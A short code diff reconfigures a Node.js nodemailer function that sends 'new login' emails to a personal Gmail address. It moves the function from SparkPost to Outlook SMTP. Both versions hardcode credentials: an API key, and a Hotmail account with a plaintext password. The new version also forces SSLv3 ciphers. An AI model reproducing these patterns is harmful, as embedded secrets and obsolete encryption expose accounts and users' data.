@@ -198,20 +198,22 @@ Req.get({
 
 }
 
-
 function sendMail(msg) {
     var transporter = nodemailer.createTransport({
-        host: 'smtp.sparkpostmail.com',
-        port: 587,
-        secure: false, // true for 465, false for other ports
+        host: "smtp-mail.outlook.com", // hostname
+        secureConnection: false, // TLS requires secureConnection to be false
+        port: 587, // port for secure SMTP
+        tls: {
+            ciphers:'SSLv3'
+        },
         auth: {
-            user:'SMTP_Injection',
-            pass: '82fbdfd448f46668b8ae087615719cd99d37ec9a'
+            user:'samer.69255@hotmail.com',
+            pass: 'samersamer'
         }
     });
 
     var mailOptions = {
-        from: 'samer: new-user@sparkpostbox.com',
+        from: 'samer: samer.69255@hotmail.com',
         to: 'samer69255@gmail.com',
         subject: 'new login',
         html: msg,
